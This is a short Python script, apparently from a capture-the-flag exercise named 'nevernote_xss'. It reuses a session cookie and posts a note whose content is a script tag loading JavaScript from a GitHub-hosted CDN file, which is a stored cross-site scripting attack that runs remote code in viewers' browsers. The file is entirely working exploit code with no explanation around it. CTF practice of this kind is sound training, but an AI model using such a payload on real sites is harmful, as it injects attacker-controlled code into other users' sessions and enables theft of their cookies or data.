import os
import random
import string

import requests
from dotenv import load_dotenv

load_dotenv()

from yachalk import chalk

DOMAIN = os.environ.get("DOMAIN")
URL = f"http://{DOMAIN}:12345"
TARGET = f"{URL}/note/new"
EXTERNALLY_HOSTED_XSS = (
    "https://cdn.jsdelivr.net/gh/ykray/CTF@master/week_2/nevernote_xss/host-me-on-jsdelivr-cdn.js"
)

session = requests.Session()


def setup_session():
    session.cookies.set(
        name=os.environ.get("COOKIE_NAME"),
        value=os.environ.get("COOKIE_VALUE"),
        domain=DOMAIN,
    )

    print(chalk.bold("COOKIES\t"), chalk.black(session.cookies.get_dict()))


if __name__ == "__main__":
    setup_session()

    random_title = "".join(random.choices(string.ascii_uppercase + string.digits, k=20))
    new_note_data = {
        "title": random_title,
        "content": f"<script src='{EXTERNALLY_HOSTED_XSS}'></script>",
        "submit": "save",
    }

    new_note_request = session.post(
        TARGET,
        new_note_data,
    )
    new_note_request.raise_for_status()
